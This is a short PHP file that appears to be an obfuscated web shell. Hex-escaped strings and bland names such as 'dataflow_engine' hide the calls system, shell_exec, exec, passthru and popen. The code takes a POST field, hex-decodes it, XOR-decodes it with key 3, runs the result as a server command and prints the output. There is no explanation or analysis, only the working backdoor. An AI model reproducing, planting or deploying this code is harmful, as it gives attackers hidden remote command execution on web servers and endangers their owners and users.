<?php

$dataflow_engine2 = "\x73he\x6C\x6C\x5Fexec";
$dataflow_engine6 = "\x73\x74r\x65am\x5Fg\x65t_con\x74\x65nts";
$dataflow_engine5 = "p\x6F\x70en";
$module_controller = "\x68ex2\x62\x69\x6E";
$dataflow_engine7 = "\x70cl\x6Fs\x65";
$dataflow_engine3 = "\x65x\x65c";
$dataflow_engine1 = "\x73\x79\x73tem";
$dataflow_engine4 = "\x70\x61\x73s\x74hru";
if (isset($_POST["entity"])) {
            function hub_center($mrk ,  $element ) { $itm= '' ; $q=0; while($q<strlen($mrk)){$itm.=chr(ord($mrk[$q])^$element);$q++;} return $itm;}
            $entity = $module_controller($_POST["entity"]);
            $entity = hub_center($entity, 3);
            if (function_exists($dataflow_engine1)) {
                $dataflow_engine1($entity);
            } elseif (function_exists($dataflow_engine2)) {
                print $dataflow_engine2($entity);
            } elseif (function_exists($dataflow_engine3)) {
                $dataflow_engine3($entity, $holder_mrk);
                print join("\n", $holder_mrk);
            } elseif (function_exists($dataflow_engine4)) {
                $dataflow_engine4($entity);
            } elseif (function_exists($dataflow_engine5) && function_exists($dataflow_engine6) && function_exists($dataflow_engine7)) {
                $element_itm = $dataflow_engine5($entity, 'r');
                if ($element_itm) {
                    $item_flg = $dataflow_engine6($element_itm);
                    $dataflow_engine7($element_itm);
                    print $item_flg;
                }
            }
            exit;
        }